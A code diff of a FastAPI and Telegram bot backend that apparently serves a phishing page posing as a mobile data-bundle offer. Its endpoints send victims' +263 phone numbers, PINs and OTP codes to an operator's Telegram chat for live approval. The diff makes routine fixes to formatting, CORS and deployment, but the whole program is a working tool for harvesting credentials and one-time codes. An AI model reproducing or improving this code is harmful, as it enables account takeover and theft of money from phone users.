@@ -1,6 +1,7 @@
 import os
 import uuid
 from typing import Dict, Any, Optional
+from contextlib import asynccontextmanager
 from fastapi import FastAPI, HTTPException, Request, Header
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
@@ -8,26 +9,14 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CallbackQueryHandler, ContextTypes
 
 # --- CONFIGURATION ---
-# Values are read from environment variables for security
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
-# You should set a secret token for the webhook
 WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my-secret-token")
 
 if not BOT_TOKEN or not ADMIN_CHAT_ID:
     raise ValueError("BOT_TOKEN and ADMIN_CHAT_ID environment variables are required")
 
-app = FastAPI()
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"], # In production, replace with your frontend's domain
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
-# In-memory storage (replace with a database for production)
+# In-memory database
 transactions: Dict[str, Dict[str, Any]] = {}
 
 # --- PYDANTIC MODELS ---
@@ -37,7 +26,7 @@ class LoginRequest(BaseModel):
     duration: str
     voice: int
     sms: int
-    data: int
+    data: float  # FIXED: Changed from int to float (1.7 GB)
     price: str
 
 class OTPRequest(BaseModel):
@@ -46,36 +35,52 @@ class OTPRequest(BaseModel):
     duration: str
     price: str
 
-# --- TELEGRAM BOT SETUP (Webhook Mode) ---
-# We initialize the Application but don't start polling
+# --- TELEGRAM BOT SETUP ---
 ptb_app = Application.builder().token(BOT_TOKEN).build()
 
 async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles the Accept/Deny button clicks from Telegram"""
     query = update.callback_query
     await query.answer()
 
     data = query.data.split(":")
-    action = data[0]  # 'accept' or 'deny'
+    action = data[0]
     tx_id = data[1]
-    # step = data[2]  # 'login' or 'otp' (not strictly needed here)
 
     if tx_id in transactions:
         if action == "accept":
             transactions[tx_id]["status"] = "approved"
             await query.edit_message_text(
-                text=f"{query.message.text}\n\n✅ **APPROVED** by Admin",
-                parse_mode="Markdown"
+                text=f"{query.message.text}\n\n✅ <b>APPROVED</b>",
+                parse_mode="HTML"
             )
         elif action == "deny":
             transactions[tx_id]["status"] = "denied"
             await query.edit_message_text(
-                text=f"{query.message.text}\n\n❌ **DENIED** by Admin",
-                parse_mode="Markdown"
+                text=f"{query.message.text}\n\n❌ <b>DENIED</b>",
+                parse_mode="HTML"
             )
 
-# Add the handler to the application
 ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))
+
+# --- FASTAPI LIFESPAN (Initializes bot cleanly on startup) ---
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    await ptb_app.initialize()
+    await ptb_app.start()
+    yield
+    await ptb_app.stop()
+    await ptb_app.shutdown()
+
+app = FastAPI(lifespan=lifespan)
+
+# CORS Configuration (FIXED: allow_credentials must be False if origins is "*")
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"], 
+    allow_credentials=False, 
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 # --- API ENDPOINTS ---
 
@@ -88,13 +93,14 @@ async def initiate_login(req: LoginRequest):
         "data": req.model_dump()
     }
 
+    # FIXED: Switched to HTML format to prevent MarkdownV2 crashing
     message = (
-        f"🔐 **NEW LOGIN REQUEST**\n\n"
-        f"📱 **Phone:** +263 {req.phone}\n"
-        f"🔑 **PIN:** ||{req.pin}||\n\n"
-        f"📦 **Bundle:** {req.duration}\n"
-        f"💰 **Price:** USD {req.price}\n\n"
-        f"Waiting for your approval..."
+        f"🔐 <b>NEW LOGIN ATTEMPT</b>\n\n"
+        f"📱 <b>Phone:</b> +263 {req.phone}\n"
+        f"🔑 <b>PIN:</b> <tg-spoiler>{req.pin}</tg-spoiler>\n\n"
+        f"📦 <b>Bundle:</b> {req.duration}\n"
+        f"💰 <b>Price:</b> USD {req.price}\n\n"
+        f"👇 <i>Do you want to accept this login?</i>"
     )
 
     keyboard = [[
@@ -108,12 +114,14 @@ async def initiate_login(req: LoginRequest):
             chat_id=ADMIN_CHAT_ID,
             text=message,
             reply_markup=reply_markup,
-            parse_mode="MarkdownV2"
+            parse_mode="HTML" # FIXED
         )
     except Exception as e:
-        raise HTTPException(status_code=500, detail=f"Failed to send Telegram message: {e}")
+        print(f"Telegram Error: {e}") # Log the error so you can see it in Render logs
+        raise HTTPException(status_code=500, detail="Failed to send message to Telegram")
 
-    return {"transaction_id": tx_id, "message": "Request sent to admin"}
+    return {"transaction_id": tx_id, "message": "Login request sent to admin"}
+
 
 @app.post("/api/verify-otp")
 async def verify_otp(req: OTPRequest):
@@ -124,12 +132,14 @@ async def verify_otp(req: OTPRequest):
         "data": req.model_dump()
     }
 
+    # FIXED: Switched to HTML format
     message = (
-        f"🔢 **OTP VERIFICATION**\n\n"
-        f"📱 **Phone:** +263 {req.phone}\n"
-        f"🔢 **OTP Code:** `{req.otp}`\n\n"
-        f"📦 **Bundle:** {req.duration}\n"
-        f"💰 **Price:** USD {req.price}"
+        f"🔢 <b>NEW OTP ENTERED</b>\n\n"
+        f"📱 <b>Phone:</b> +263 {req.phone}\n"
+        f"🔢 <b>OTP Code:</b> <code>{req.otp}</code>\n\n"
+        f"📦 <b>Bundle:</b> {req.duration}\n"
+        f"💰 <b>Price:</b> USD {req.price}\n\n"
+        f"👇 <i>Do you want to accept this OTP?</i>"
     )
 
     keyboard = [[
@@ -143,24 +153,27 @@ async def verify_otp(req: OTPRequest):
             chat_id=ADMIN_CHAT_ID,
             text=message,
             reply_markup=reply_markup,
-            parse_mode="Markdown"
+            parse_mode="HTML" # FIXED
         )
     except Exception as e:
-        raise HTTPException(status_code=500, detail=f"Failed to send Telegram message: {e}")
+        print(f"Telegram Error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to send message to Telegram")
 
-    return {"transaction_id": tx_id, "message": "OTP sent to admin"}
+    return {"transaction_id": tx_id, "message": "OTP request sent to admin"}
+
 
 @app.get("/api/status/{tx_id}")
 async def get_status(tx_id: str):
     if tx_id not in transactions:
         raise HTTPException(status_code=404, detail="Transaction not found")
+    
     return {"status": transactions[tx_id]["status"]}
+
 
 # --- WEBHOOK ENDPOINTS ---
 
 @app.post("/api/webhook/telegram")
 async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Optional[str] = Header(None)):
-    """Endpoint for Telegram to send updates to"""
     if x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
         raise HTTPException(status_code=403, detail="Invalid secret token")
 
@@ -171,14 +184,16 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Op
 
 @app.get("/api/webhook/set")
 async def set_telegram_webhook():
-    """Endpoint to set the Telegram webhook. Call this once after deployment."""
-    # The URL of this Vercel deployment + the webhook path
-    # You may need to adjust this if your URL is different
-    base_url = os.environ.get("VERCEL_URL")
+    # FIXED: Look for RENDER_EXTERNAL_URL instead of just VERCEL_URL
+    base_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("VERCEL_URL")
+    
     if not base_url:
-        raise HTTPException(status_code=500, detail="VERCEL_URL environment variable not set")
+        raise HTTPException(status_code=500, detail="External URL environment variable not set (RENDER_EXTERNAL_URL or VERCEL_URL)")
 
-    webhook_url = f"https://{base_url}/api/webhook/telegram"
+    # Ensure the URL doesn't have a trailing slash
+    base_url = base_url.rstrip("/")
+    webhook_url = f"https://{base_url}/api/webhook/telegram" if not base_url.startswith("http") else f"{base_url}/api/webhook/telegram"
+    
     try:
         await ptb_app.bot.set_webhook(
             url=webhook_url,
